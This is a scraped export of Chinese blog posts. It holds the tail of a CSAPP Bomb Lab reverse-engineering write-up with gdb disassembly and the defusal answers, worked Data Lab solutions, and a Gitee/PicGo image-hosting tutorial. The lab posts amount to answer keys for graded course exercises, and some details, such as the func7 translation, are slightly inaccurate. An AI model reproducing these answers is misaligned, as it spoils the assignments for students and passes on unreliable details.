\u0026lt;node6\u0026gt;  但是这个顺序是由 （7-输入的数）得到的，所以我们需要再用7减一次，就得到我们想要的结果了。\n4 3 2 1 6 5  运行一下看看结果\n(gdb) run Welcome to my fiendish little bomb. You have 6 phases with which to blow yourself up. Have a nice day! Border relations with Canada have never been better. Phase 1 defused. How about the next one? 1 2 4 8 16 32 That's number 2. Keep going! 1 311 Halfway there! 7 0 So you got that one. Try this one. IONEFG Good work! On to the next... 4 3 2 1 6 5 Congratulations! You've defused the bomb!  至此，该实验的几个任务算基本完成了。后面其实还有一个secret_phase。\nsecret_phase 首先，从bomb.c文件里面的内容可以看到，这个函数是没有直接显示入口的，需要我们找一下。查找以下secret_phase出现的地方,发现pahase_defused这个函数有调用到。我们看看这个函数的内容：\n00000000004015c4 \u0026lt;phase_defused\u0026gt;: 4015c4:\t48 83 ec 78 sub $0x78,%rsp 4015c8:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax 4015cf:\t00 00 4015d1:\t48 89 44 24 68 mov %rax,0x68(%rsp) 4015d6:\t31 c0 xor %eax,%eax 4015d8:\t83 3d 81 21 20 00 06 cmpl $0x6,0x202181(%rip) # 603760 \u0026lt;num_input_strings\u0026gt; 4015df:\t75 5e jne 40163f \u0026lt;phase_defused+0x7b\u0026gt; 4015e1:\t4c 8d 44 24 10 lea 0x10(%rsp),%r8 4015e6:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx 4015eb:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx 4015f0:\tbe 19 26 40 00 mov $0x402619,%esi 4015f5:\tbf 70 38 60 00 mov $0x603870,%edi 4015fa:\te8 f1 f5 ff ff callq 400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; 4015ff:\t83 f8 03 cmp $0x3,%eax 401602:\t75 31 jne 401635 \u0026lt;phase_defused+0x71\u0026gt; 401604:\tbe 22 26 40 00 mov $0x402622,%esi 401609:\t48 8d 7c 24 10 lea 0x10(%rsp),%rdi 40160e:\te8 25 fd ff ff callq 401338 \u0026lt;strings_not_equal\u0026gt; 401613:\t85 c0 test %eax,%eax 401615:\t75 1e jne 401635 \u0026lt;phase_defused+0x71\u0026gt; 401617:\tbf f8 24 40 00 mov $0x4024f8,%edi 40161c:\te8 ef f4 ff ff callq 400b10 \u0026lt;puts@plt\u0026gt; 401621:\tbf 20 25 40 00 mov $0x402520,%edi 401626:\te8 e5 f4 ff ff callq 400b10 \u0026lt;puts@plt\u0026gt; 40162b:\tb8 00 00 00 00 mov $0x0,%eax 401630:\te8 0d fc ff ff callq 401242 \u0026lt;secret_phase\u0026gt; 401635:\tbf 58 25 40 00 mov $0x402558,%edi 40163a:\te8 d1 f4 ff ff callq 400b10 \u0026lt;puts@plt\u0026gt; 40163f:\t48 8b 44 24 68 mov 0x68(%rsp),%rax 401644:\t64 48 33 04 25 28 00 xor %fs:0x28,%rax 40164b:\t00 00 40164d:\t74 05 je 401654 \u0026lt;phase_defused+0x90\u0026gt; 40164f:\te8 dc f4 ff ff callq 400b30 \u0026lt;__stack_chk_fail@plt\u0026gt; 401654:\t48 83 c4 78 add $0x78,%rsp 401658:\tc3 retq 401659:\t90 nop 40165a:\t90 nop 40165b:\t90 nop 40165c:\t90 nop 40165d:\t90 nop 40165e:\t90 nop 40165f:\t90 nop  打印一下0x402619的内容：\n(gdb) x/s 0x402619 0x402619:\t\u0026quot;%d %d %s\u0026quot;  cmp $0x3,%eax jne 401635 \u0026lt;phase_defused+0x71\u0026gt;  这里显示 两个整形数与一个字符串格式，接着就调用scanf函数输入数据。紧接着，返回值与3进行比较，如果不相等就会跳过下面的部分，可以看到刚好跳到了call secret_phase的后面一行。这个返回值也是我们输入参数的个数，也就是说当我们输入参数为3 ，且按照\u0026quot;%d %d %s\u0026quot;的格式输入就会继续往下执行，不会跳过。\n再往下，打印0x402622的内容：\n‵‵‵ 0000000000401204 \u0026lt;fun7\u0026gt;: 401204:\t48 83 ec 08 sub $0x8,%rsp 401208:\t48 85 ff test %rdi,%rdi 40120b:\t74 2b je 401238 \u0026lt;fun7+0x34\u0026gt; 40120d:\t8b 17 mov (%rdi),%edx 40120f:\t39 f2 cmp %esi,%edx 401211:\t7e 0d jle 401220 \u0026lt;fun7+0x1c\u0026gt; 401213:\t48 8b 7f 08 mov 0x8(%rdi),%rdi 401217:\te8 e8 ff ff ff callq 401204 \u0026lt;fun7\u0026gt; 40121c:\t01 c0 add %eax,%eax 40121e:\teb 1d jmp 40123d \u0026lt;fun7+0x39\u0026gt; 401220:\tb8 00 00 00 00 mov $0x0,%eax 401225:\t39 f2 cmp %esi,%edx 401227:\t74 14 je 40123d \u0026lt;fun7+0x39\u0026gt; 401229:\t48 8b 7f 10 mov 0x10(%rdi),%rdi 40122d:\te8 d2 ff ff ff callq 401204 \u0026lt;fun7\u0026gt; 401232:\t8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401236:\teb 05 jmp 40123d \u0026lt;fun7+0x39\u0026gt; 401238:\tb8 ff ff ff ff mov $0xffffffff,%eax 40123d:\t48 83 c4 08 add $0x8,%rsp 401241:\tc3 retq 0000000000401242 \u0026lt;secret_phase\u0026gt;: 401242:\t53 push %rbx 401243:\te8 56 02 00 00 callq 40149e \u0026lt;read_line\u0026gt; 401248:\tba 0a 00 00 00 mov $0xa,%edx 40124d:\tbe 00 00 00 00 mov $0x0,%esi 401252:\t48 89 c7 mov %rax,%rdi 401255:\te8 76 f9 ff ff callq 400bd0 \u0026lt;strtol@plt\u0026gt; #strtol函数 # 会将参数nptr字符串根据参数base来转换成长整型数，参数base范围从2至36 40125a:\t48 89 c3 mov %rax,%rbx 40125d:\t8d 40 ff lea -0x1(%rax),%eax 401260:\t3d e8 03 00 00 cmp $0x3e8,%eax #1000比较 401265:\t76 05 jbe 40126c \u0026lt;secret_phase+0x2a\u0026gt; 401267:\te8 ce 01 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; # 输入的值比1000大会爆炸 40126c:\t89 de mov %ebx,%esi 40126e:\tbf f0 30 60 00 mov $0x6030f0,%edi 401273:\te8 8c ff ff ff callq 401204 \u0026lt;fun7\u0026gt; 401278:\t83 f8 02 cmp $0x2,%eax 40127b:\t74 05 je 401282 \u0026lt;secret_phase+0x40\u0026gt;# 当func7返回值为2才算成功 40127d:\te8 b8 01 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 401282:\tbf 38 24 40 00 mov $0x402438,%edi 401287:\te8 84 f8 ff ff callq 400b10 \u0026lt;puts@plt\u0026gt; 40128c:\te8 33 03 00 00 callq 4015c4 \u0026lt;phase_defused\u0026gt; 401291:\t5b pop %rbx 401292:\tc3 retq 401293:\t90 nop 401294:\t90 nop 401295:\t90 nop 401296:\t90 nop 401297:\t90 nop 401298:\t90 nop 401299:\t90 nop 40129a:\t90 nop 40129b:\t90 nop 40129c:\t90 nop 40129d:\t90 nop 40129e:\t90 nop 40129f:\t90 nop  输出 0x6030f0这个位置的内容，如下，可以看到是一棵二叉树。其中n1为根节点，nxy为第x层第y个节点。\n(gdb) x/120a 0x6030f0 0x6030f0 \u0026lt;n1\u0026gt;:\t0x24\t0x603110 \u0026lt;n21\u0026gt; 0x603100 \u0026lt;n1+16\u0026gt;:\t0x603130 \u0026lt;n22\u0026gt;\t0x0 0x603110 \u0026lt;n21\u0026gt;:\t0x8\t0x603190 \u0026lt;n31\u0026gt; 0x603120 \u0026lt;n21+16\u0026gt;:\t0x603150 \u0026lt;n32\u0026gt;\t0x0 0x603130 \u0026lt;n22\u0026gt;:\t0x32\t0x603170 \u0026lt;n33\u0026gt; 0x603140 \u0026lt;n22+16\u0026gt;:\t0x6031b0 \u0026lt;n34\u0026gt;\t0x0 0x603150 \u0026lt;n32\u0026gt;:\t0x16\t0x603270 \u0026lt;n43\u0026gt; 0x603160 \u0026lt;n32+16\u0026gt;:\t0x603230 \u0026lt;n44\u0026gt;\t0x0 0x603170 \u0026lt;n33\u0026gt;:\t0x2d\t0x6031d0 \u0026lt;n45\u0026gt; 0x603180 \u0026lt;n33+16\u0026gt;:\t0x603290 \u0026lt;n46\u0026gt;\t0x0 0x603190 \u0026lt;n31\u0026gt;:\t0x6\t0x6031f0 \u0026lt;n41\u0026gt; 0x6031a0 \u0026lt;n31+16\u0026gt;:\t0x603250 \u0026lt;n42\u0026gt;\t0x0 0x6031b0 \u0026lt;n34\u0026gt;:\t0x6b\t0x603210 \u0026lt;n47\u0026gt; 0x6031c0 \u0026lt;n34+16\u0026gt;:\t0x6032b0 \u0026lt;n48\u0026gt;\t0x0 0x6031d0 \u0026lt;n45\u0026gt;:\t0x28\t0x0 0x6031e0 \u0026lt;n45+16\u0026gt;:\t0x0\t0x0 0x6031f0 \u0026lt;n41\u0026gt;:\t0x1\t0x0 0x603200 \u0026lt;n41+16\u0026gt;:\t0x0\t0x0 0x603210 \u0026lt;n47\u0026gt;:\t0x63\t0x0 0x603220 \u0026lt;n47+16\u0026gt;:\t0x0\t0x0 0x603230 \u0026lt;n44\u0026gt;:\t0x23\t0x0 0x603240 \u0026lt;n44+16\u0026gt;:\t0x0\t0x0 0x603250 \u0026lt;n42\u0026gt;:\t0x7\t0x0  那么我们可以将func7 转换为c语言代码：\nint func7(node *root,int num){ if(root==NULL)return 0; if(root-\u0026gt;val==num)return 0; else if(root-\u0026gt;val \u0026lt; num)return 2*func7(root-\u0026gt;right)+1; return 2*func7(root-\u0026gt;left); }  当我们想要func7返回的结果为2的时候，应当执行的结果为 2*(1+(0))。所以 num \u0026lt; root-\u0026gt;val\u0026amp;\u0026amp;num \u0026gt; root-\u0026gt;left-\u0026gt;val\u0026amp;\u0026amp;num==root-\u0026gt;left-\u0026gt;right-\u0026gt;val。查看\u0026lt;n32\u0026gt; :0x16 这就是我们要的答案。0x16 转10进制 22。\n总结 这次实验对自己汇编语言这块的掌握巩固有很大促进作用，通过实验，自己学习到了汇编语言的一些语法，学会看一些汇编代码了。同时也开始接触到gdb这个工具，以前就是写c++或者c语言代码，用这个做断点，然后按F5调试使用，没有用它来做过其他工作，也不知了解它的强大的功能，在实验 中也是多次用到了，例如查看某个地址的内容等。实验虽然结束了，但是对汇编以及GDB的学习还需要继续下去！\n","id":1,"section":"posts","summary":"CSAPP\u0026ndash;Bomb Lab实验记录 前言 本实验是《深入理解计算机系统》一书中的附带实验——二进制炸弹实验。二进制炸弹是一个作为目标代码文件提供给学生们的程序。运","tags":["csapp-lab","汇编"],"title":"CSAPP--Bomb Lab实验记录","uri":"https://www.stana.top/2021/12/bomb_lab/","year":"2021"},{"content":"CSAPP\u0026ndash;Data Lab实验记录 [TOC]\n前言  Students implement simple logical, two\u0026rsquo;s complement, and floating point functions, but using a highly restricted subset of C. For example, they might be asked to compute the absolute value of a number using only bit-level operations and straightline code. This lab helps students understand the bit-level representations of C data types and the bit-level behavior of the operations on data.\n 实验要求 /* * Instructions to Students: * * STEP 1: Read the following instructions carefully. */ You will provide your solution to the Data Lab by editing the collection of functions in this source file. INTEGER CODING RULES: Replace the \u0026quot;return\u0026quot; statement in each function with one or more lines of C code that implements the function. Your code must conform to the following style: int Funct(arg1, arg2, ...) { /* brief description of how your implementation works */ int var1 = Expr1; ... int varM = ExprM; varJ = ExprJ; ... varN = ExprN; return ExprR; } Each \u0026quot;Expr\u0026quot; is an expression using ONLY the following: 1. Integer constants 0 through 255 (0xFF), inclusive. You are not allowed to use big constants such as 0xffffffff. 2. Function arguments and local variables (no global variables). 3. Unary integer operations ! ~ 4. Binary integer operations \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; Some of the problems restrict the set of allowed operators even further. Each \u0026quot;Expr\u0026quot; may consist of multiple operators. You are not restricted to one operator per line. You are expressly forbidden to: 1. Use any control constructs such as if, do, while, for, switch, etc. 2. Define or use any macros. 3. Define any additional functions in this file. 4. Call any functions. 5. Use any other operations, such as \u0026amp;\u0026amp;, ||, -, or ?: 6. Use any form of casting. 7. Use any data type other than int. This implies that you cannot use arrays, structs, or unions. You may assume that your machine: 1. Uses 2s complement, 32-bit representations of integers. 2. Performs right shifts arithmetically. 3. Has unpredictable behavior when shifting an integer by more than the word size. EXAMPLES OF ACCEPTABLE CODING STYLE: /* * pow2plus1 - returns 2^x + 1, where 0 \u0026lt;= x \u0026lt;= 31 */ int pow2plus1(int x) { /* exploit ability of shifts to compute powers of 2 */ return (1 \u0026lt;\u0026lt; x) + 1; } /* * pow2plus4 - returns 2^x + 4, where 0 \u0026lt;= x \u0026lt;= 31 */ int pow2plus4(int x) { /* exploit ability of shifts to compute powers of 2 */ int result = (1 \u0026lt;\u0026lt; x); result += 4; return result; } FLOATING POINT CODING RULES For the problems that require you to implent floating-point operations, the coding rules are less strict. You are allowed to use looping and conditional control. You are allowed to use both ints and unsigneds. You can use arbitrary integer and unsigned constants. You are expressly forbidden to: 1. Define or use any macros. 2. Define any additional functions in this file. 3. Call any functions. 4. Use any form of casting. 5. Use any data type other than int or unsigned. This means that you cannot use arrays, structs, or unions. 6. Use any floating point data types, operations, or constants. NOTES: 1. Use the dlc (data lab checker) compiler (described in the handout) to check the legality of your solutions. 2. Each function has a maximum number of operators (! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt;) that you are allowed to use for your implementation of the function. The max operator count is checked by dlc. Note that '=' is not counted; you may use as many of these as you want without penalty. 3. Use the btest test harness to check your functions for correctness. 4. Use the BDD checker to formally verify your functions 5. The maximum number of ops for each function is given in the header comment for each function. If there are any inconsistencies between the maximum ops in the writeup and in this file, consider this file the authoritative source. /* * STEP 2: Modify the following functions according the coding rules. * * IMPORTANT. TO AVOID GRADING SURPRISES: * 1. Use the dlc compiler to check that your solutions conform * to the coding rules. * 2. Use the BDD checker to formally verify that your solutions produce * the correct answers. */  实验内容 1. bitAnd 题目要求只能使用 ~ 与 | 进行解答。可以想想摩尔运算 A\u0026amp;B = ~（（~A) | (~B) )\n/* * bitAnd - x\u0026amp;y using only ~ and | * Example: bitAnd(6, 5) = 4 * Legal ops: ~ | * Max ops: 8 * Rating: 1 */ int bitAnd(int x, int y) { return ~((~x)|(~y)); }  2 .getByte 获取第 （n+1） 字节。一个字节8 bit，n字节 为 8*n bit = (n\u0026laquo;3) bit 。所以可以将x 右移 n\u0026laquo;3 bit，然后与 0xff 做与运算，得到结果。\n/* * getByte - Extract byte n from word x * Bytes numbered from 0 (LSB) to 3 (MSB) * Examples: getByte(0x12345678,1) = 0x56 * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 6 * Rating: 2 */ int getByte(int x, int n) { int mask=0xff; return (x\u0026gt;\u0026gt;(n\u0026lt;\u0026lt;3))\u0026amp;mask; }  3. logicalShift 在c语言中 \u0026gt;\u0026gt;运算为算术右移，当x\u0026lt;0 时，右移最高位会补1，x\u0026gt;0，右移最高位补0。而逻辑右移，最高位都是补0。\n所以解题思路，可以先做 x\u0026raquo;n 然后再与mask=0xfffffff移位后的结果做\u0026amp;运算。 ((0x1\u0026lt;\u0026lt;(32+~n))+~0)|(0x1\u0026lt;\u0026lt;(32+~n)) 这个就是构造mask的方法。\n~0=-，这个式子就类似 (m-1)|(m) ,例如 7|8 == 0111 | 1000 =1111就是让最高位与后面的位都置1.\n/* * logicalShift - shift x to the right by n, using a logical shift * Can assume that 0 \u0026lt;= n \u0026lt;= 31 * Examples: logicalShift(0x87654321,4) = 0x08765432 * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 20 * Rating: 3 */ int logicalShift(int x, int n) { int mask=((0x1\u0026lt;\u0026lt;(32+~n))+~0)|(0x1\u0026lt;\u0026lt;(32+~n)); return (x\u0026gt;\u0026gt;n)\u0026amp;mask; }  4. bitCount 这个题目要求算出 x 的二进制 中 1的个数。\n/* * bitCount - returns count of number of 1's in word * Examples: bitCount(5) = 2, bitCount(7) = 3 * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 40 * Rating: 4 */ int bitCount(int x) { int mk1, mk2, mk3, mk4, mk5, result; mk5 = 0xff | (0xff \u0026lt;\u0026lt; 8); mk4 = 0xff | (0xff \u0026lt;\u0026lt; 16); mk3 = 0x0f | (0x0f \u0026lt;\u0026lt; 8); mk3 = mk3 | (mk3 \u0026lt;\u0026lt; 16); mk2 = 0x33 | (0x33 \u0026lt;\u0026lt; 8); mk2 = mk2 | (mk2 \u0026lt;\u0026lt; 16); mk1 = 0x55 | (0x55 \u0026lt;\u0026lt; 8); mk1 = mk1 | (mk1 \u0026lt;\u0026lt; 16); // 先把16个相邻两位有几个1，并用这两位表示，然后以此类推， // 即： 32-\u0026gt;16， 16-\u0026gt;8， 8-\u0026gt;4， 4-\u0026gt;2， 2-\u0026gt;1 result = (mk1 \u0026amp; x) + (mk1 \u0026amp; (x \u0026gt;\u0026gt; 1)); result = (mk2 \u0026amp; result) + (mk2 \u0026amp; (result \u0026gt;\u0026gt; 2)); result = mk3 \u0026amp; (result + (result \u0026gt;\u0026gt; 4)); result = mk4 \u0026amp; (result + (result \u0026gt;\u0026gt; 8)); result = mk5 \u0026amp; (result + (result \u0026gt;\u0026gt; 16)); return result; }  5. bang 不能使用!计算 !x。这道题的思路是找x 的二进制数是否存在 1，那么可以利用二分查找的思想，先找高16位。若高16位为0，则找低16位。否则在高16位找。\n然后又折半，找八位\u0026hellip;\u0026hellip;以此类推，最后得到 x，0 -\u0026gt;1,1-\u0026gt;0。\n思路2 一个非0的数与其相反数做 |运算，则最高位为1， x |((~x)+1。当x=0时，结果依然为0。所以可以通过判断最高位的值然后做 ~运算 再\u0026amp;1得到结果。\n/* * bang - Compute !x without using ! * Examples: bang(3) = 0, bang(0) = 1 * Legal ops: ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 12 * Rating: 4 */ int bang(int x) { x=(x\u0026gt;\u0026gt;16)|x; x=(x\u0026gt;\u0026gt;8)|x; x=(x\u0026gt;\u0026gt;4)|x; x=(x\u0026gt;\u0026gt;2)|x; x=(x\u0026gt;\u0026gt;1)|x; return ~x\u0026amp;0x1; } /* *题解2 */ int bang(int x) { x=(x\u0026gt;\u0026gt;16)|x; x=(x\u0026gt;\u0026gt;8)|x; x=(x\u0026gt;\u0026gt;4)|x; x=(x\u0026gt;\u0026gt;2)|x; x=(x\u0026gt;\u0026gt;1)|x; return ~x\u0026amp;0x1; }  6. tmin 二进制补码最小值\n/* * tmin - return minimum two's complement integer * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 4 * Rating: 1 */ int tmin(void) { return 0x1\u0026lt;\u0026lt;31; }  7. fitsBits 只给出n个二进制位，能否表示x。\n可以先将x 右移 n-1 位，然后，比较这时是否全1或全0，若是，则可以表示，若不是，则不能表示。\n/* * fitsBits - return 1 if x can be represented as an * n-bit, two's complement integer. * 1 \u0026lt;= n \u0026lt;= 32 * Examples: fitsBits(5,3) = 0, fitsBits(-4,3) = 1 * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 15 * Rating: 2 */ int fitsBits(int x, int n) { int bit = ~(~n+1); int temp = x\u0026gt;\u0026gt;bit; return !temp|!(temp+1); }  8. divpwr2 计算 x/(2^n) 但结果需要向0 靠近。\n主要考虑负数的情况，因为 -33/16 = -3，向更小的方向靠近了。所以可以构造一个数 bias （偏置）使得在 x \u0026gt;= 0时，bias = 0；在 x \u0026lt; 0 时，bias = (1 \u0026laquo; n) - 1;\n/* * divpwr2 - Compute x/(2^n), for 0 \u0026lt;= n \u0026lt;= 30 * Round toward zero * Examples: divpwr2(15,1) = 7, divpwr2(-33,4) = -2 * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 15 * Rating: 2 */ int divpwr2(int x, int n) { int bias=(x\u0026gt;\u0026gt;31)\u0026amp;((0x1\u0026lt;\u0026lt;n)+~0); return (x+bias)\u0026gt;\u0026gt;n; }  9. negate 相反数\n/* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 5 * Rating: 2 */ int negate(int x) { return (~x+1); }  10. isPositive 判断是否为正数\n/* * isPositive - return 1 if x \u0026gt; 0, return 0 otherwise * Example: isPositive(-1) = 0. * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 8 * Rating: 3 */ int isPositive(int x) { int tmp=(x\u0026gt;\u0026gt;31)\u0026amp;0x1; int ans = !(!tmp|x); return ans; }  11. isLessOrEqual x \u0026lt;= y 是否成立。可以用x-y 判断结果是否为非正数。\n/* * isLessOrEqual - if x \u0026lt;= y then return 1, else return 0 * Example: isLessOrEqual(4,5) = 1. * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 24 * Rating: 3 */ int isLessOrEqual(int x, int y) { int val=!!((x+~y)\u0026gt;\u0026gt;31); x=x\u0026gt;\u0026gt;31; y=y\u0026gt;\u0026gt;31; return (!!x|!y)\u0026amp;((!!x\u0026amp;!y)|(val)); }  12. ilog2 思路有点像第五题，这道题主要是想找出最高位的1是第几位。\n/* * ilog2 - return floor(log base 2 of x), where x \u0026gt; 0 * Example: ilog2(16) = 4 * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 90 * Rating: 4 */ int ilog2(int x) { int ans=0; ans=(!!(x\u0026gt;\u0026gt;(16)))\u0026lt;\u0026lt;4; ans=ans+((!!(x\u0026gt;\u0026gt;(8+ans)))\u0026lt;\u0026lt;3); ans=ans+((!!(x\u0026gt;\u0026gt;(4+ans)))\u0026lt;\u0026lt;2); ans=ans+((!!(x\u0026gt;\u0026gt;(2+ans)))\u0026lt;\u0026lt;1); ans=ans+((!!(x\u0026gt;\u0026gt;(1+ans)))\u0026lt;\u0026lt;0); return ans; }  13. float_neg 计算浮点数x的负数。。浮点数是由s(1位)E(8位)M(23位)(-1)^s * M * 2^E组成的浮点数。判断是否为NAN\n/* * float_neg - Return bit-level equivalent of expression -f for * floating point argument f. * Both the argument and result are passed as unsigned int's, but * they are to be interpreted as the bit-level representations of * single-precision floating point values. * When argument is NaN, return argument. * Legal ops: Any integer/unsigned operations incl. ||, \u0026amp;\u0026amp;. also if, while * Max ops: 10 * Rating: 2 */ unsigned float_neg(unsigned uf) { int c=0x00ffffff; if(((uf\u0026lt;\u0026lt;1)^(0xffffffff))\u0026lt;c){ return uf; }else{ return uf^(0x80000000); } }  14. float_i2f 将int转换为float\n/* * float_i2f - Return bit-level equivalent of expression (float) x * Result is returned as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point values. * Legal ops: Any integer/unsigned operations incl. ||, \u0026amp;\u0026amp;. also if, while * Max ops: 30 * Rating: 4 */ unsigned float_i2f(int x) { unsigned ans; int tmpx=x; int f=0; int delta=0; int tail=0; int E=0; if(x == 0) return x; if(x == 0x80000000) return 0xcf000000; ans=x\u0026amp;0x80000000; if(ans) tmpx = -x; while( (tmpx\u0026gt;\u0026gt;E)) E++; E = E -1; tmpx = tmpx\u0026lt;\u0026lt;(31-E); tail = (tmpx \u0026gt;\u0026gt; 8) \u0026amp; 0x007FFFFF; f = tmpx \u0026amp; 0xff; delta =(f\u0026gt;128) || ( (f == 128) \u0026amp;\u0026amp; (tail \u0026amp; 1) ); tail+=delta; E=E+127; if(tail \u0026gt;\u0026gt; 23) { tail = tail \u0026amp;0x007FFFFF; E+=1; } ans=ans | E \u0026lt;\u0026lt; 23 | tail; return ans; }  15. float_twice /* * float_twice - Return bit-level equivalent of expression 2*f for * floating point argument f. * Both the argument and result are passed as unsigned int's, but * they are to be interpreted as the bit-level representation of * single-precision floating point values. * When argument is NaN, return argument * Legal ops: Any integer/unsigned operations incl. ||, \u0026amp;\u0026amp;. also if, while * Max ops: 30 * Rating: 4 */ unsigned float_twice(unsigned uf) { unsigned S=uf\u0026amp;0x80000000; unsigned E=uf\u0026amp;0x7F800000; unsigned M=uf\u0026amp;0x007FFFFF; unsigned wu = 0xFF000000; unsigned tmp = uf \u0026lt;\u0026lt; 1; unsigned ans = uf; if( ( wu \u0026amp; tmp ) == wu) { return uf; } if(E != 0) { ans=S+(E+0x00800000)+M; } else if( M!=0 ) { ans=S+E+(M \u0026lt;\u0026lt; 1); } return ans; }  ","id":2,"section":"posts","summary":"CSAPP\u0026ndash;Data Lab实验记录 [TOC] 前言 Students implement simple logical, two\u0026rsquo;s complement, and floating point functions, but using a highly restricted subset of C. For example, they might be asked to compute the absolute value of a number using only bit-level operations and straightline code. This lab helps students understand the bit-level representations of C data types and the bit-level behavior of the operations on","tags":["csapp-lab"],"title":"CSAPP--Data Lab实验记录","uri":"https://www.stana.top/2021/12/csapp_datalab/","year":"2021"},{"content":"一、前言 Markdown是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档，Markdown文件的后缀名便是“.md”。Markdown处在于网络中的各个角落，StackOverflow、CSDN、掘金、简书、GitBook、有道云笔记、V2EX、光谷社区等。主流的代码托管平台，如 GitHub、GitLab、BitBucket、Coding、Gitee 等等，都支持 Markdown 语法，很多开源项目的 README、开发文档、帮助文档、Wiki 等都用 Markdown 写作。\n像你现在在这个博客网站上面看到的文章，背后都是基于Markdown的语法编写的。在写作的时候，插入图片经常会阻碍到自己写作的进度，文章中引用某个地址的图片（可能是本地），在其他平台上面展示的时候可能有些不支持，导致图片无法正常显示，解决这个问题方法之一就是 图床。\n二、图床 图床可以理解为一个专门存储图片的网盘，当我们上传图片到图床的时候，会为该图片生成一个地址，用户可以通过这个地址访问到该图片。\n常见的图床有\n  七牛云\n  腾讯云\n  阿里云\n  聚合图床\n  ImageURL\n  知乎\n  路过图床\n  Github\n  Gitee\n\u0026hellip;\u0026hellip;\n上述的图床，有些需要收费，有些需要各种验证，比较麻烦。个人选择 Gitee的原因：\n Gitee被称为国内版Github，有保障点 自己有账号，且免费（但是一个仓库最多5G，但是也绰绰有余了） 服务器在国内，访问速度快    2.1 创建图床 2.1.1注册登录Gitee 访问Gitee ，注册并登录\n新建仓库 这个新仓库专门用于存储图片使用\n仓库名称自定义，例如：imagebed\n选择 开源，否则访问不了图片\n2.1.2 创建私人令牌 这个私人令牌主要是为了后面 PicGo准备的\n设置 -\u0026gt; 私人令牌  令牌权限只需要设置一个 projects 即可\n注意这里的私人令牌只显示一次，请复制然后在其他空白地方先记下来\n到此，图床创建完成！\n三、PicGo PicGo 是一款比较优秀的图床工具。它是一款用 Electron-vue 开发的软件，可以支持微博，七牛云，腾讯云COS，GitHub，阿里云OSS，imgur 等常用图床，当然Gitee 也提供了相应的插件，功能强大，简单易用。\n 下载链接 使用文档  安装完成后，打开应用主页进行插件配置等工作\n1、首先安装Gitee 插件，默认是没有该图床插件的。所以，点击 插件设置，在搜索框输入 gitee搜索，安装下图的插件\n2、安装完毕之后，点击左侧 图床设置\u0026ndash;\u0026gt;Gitee图床，开始Gitee图床配置\n owner：gitee用户名 repo ：图床的仓库名 path：图片保存的目录 token：上面步骤的私人令牌  最后点击 确定、设为默认图床即可完成配置\n使用\n点击 上传区\n将图片拖入或者点击上传 或者 点击 剪贴板图片将剪贴板的图片上传。左下边可以选择结果链接的形式。\n可以在 PicGo设置上传提示，这样就会有进度与成功提示\n最后，在复制板中就有自己刚刚上传图片的结果了。\n四、Typora 使用图床 typora 作为一款专业的markdown编辑工具，是我们进行markdown写作的一大利器。现在仍然使用它来写作。\n（坏消息：最近开始需要收费了，附上一个收费前最后一次更新的版本https://download.typora.io/windows/typora-update-x64-1117.exe）\n文件 --\u0026gt; 偏好设置 --\u0026gt; 图像  配置 像上图就行，更改PicGo路径为自己电脑安装的 PicGo的路径。\n之后就可以愉快的复制图片到文章里边，自动产生 Markdown 格式的图片链接，不需要自己再手动写入。\n四、总结 截止目前blog 搭建工作已完成🎈，写文章的工具也准备的七七八八了。接下来就需要开始技术记录了。\n","id":3,"section":"posts","summary":"一、前言 Markdown是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档，Markdown文件的后缀名便是“.md”。Mar","tags":["Gitee","Markdown"],"title":"Gitee PicGo打造免费个人图床","uri":"https://www.stana.top/2021/12/picturebed/","year":"2021"},{"content":"一、背景介绍 博主之前使用Hexo 搭建博客，用了三年，这个工具最大的缺点就是，每次更新blog后，项目运行跟打包的速度有点慢，直到近期在冲浪的时候发现了Hugo，号称最快的静态站点生成器。使用之后发现确实，更快，果断迁移！\n博主在第一次创建博客的时候还是一名学生，当时经济上不能满足我为搭建博客购买服务器、域名等，之后发现Github账户可以给自己开一个静态网站（可通过username.github.io访问）\u0026ndash;Git Pages 。静态网站有一些功能上的限制，如不能运行php、不能自动读写站内文件\u0026hellip;\u0026hellip;但是考虑到自己搭建博客的目的主要是记录学习、记录技术等，静态网站可以满足个人需求，主要还是因为免费，所以选择了它。但是有个缺点是访问速度慢或者无法访问，因为Github的服务器在国外，所以国内访问会受到限制。直到看到了Vercel之后找到了代替git pages的方案，下面会介绍这个网站的。\n二、开始搭建 2.1 创建网站Github仓库  Millions of developers and companies build, ship, and maintain their software on GitHub—the largest and most advanced development platform in the world.\n Github 顾名思义全球最大的同性交友（击剑）网站全球最大代码托管平台，每个程序员都应该有听过或者正在使用。我们可以将自己的网站代码托管在上面。\n2.1.1 注册Github账号 访问Github，点击右上角 Sign Up进行注册，注册成功后，Sign in进入个人主页\n2.1.2 新建仓库 点击右上角 + 